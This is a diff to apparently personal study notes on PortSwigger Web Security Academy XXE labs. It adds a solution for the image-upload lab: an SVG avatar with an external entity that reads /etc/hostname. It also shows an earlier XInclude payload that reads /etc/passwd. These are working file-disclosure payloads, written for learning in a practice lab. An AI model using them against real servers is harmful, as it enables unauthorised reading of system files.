@@ -18,3 +18,15 @@ solution: using burpsuite, send proxy intercept to repeater and send a request s
   productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude">
   <xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
 
+[lab: Exploiting XXE via image file upload]
+url: https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload
+solution: (note: I eventually looked at the solution for this one, as I couldn't get the correct tag ('text') to use without additional help.) 
+    step-1: using burpsuite repeater, create a request with the following as the avatar:
+    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
+    <svg width="200" height="200" xmlns="http://www.w3.org/2000/svg">
+        <text x="90" y="90">
+            &xxe;
+        </text>
+    </svg>
+    step-2: in the response, copy the rendered hostname from burpsuite!
+
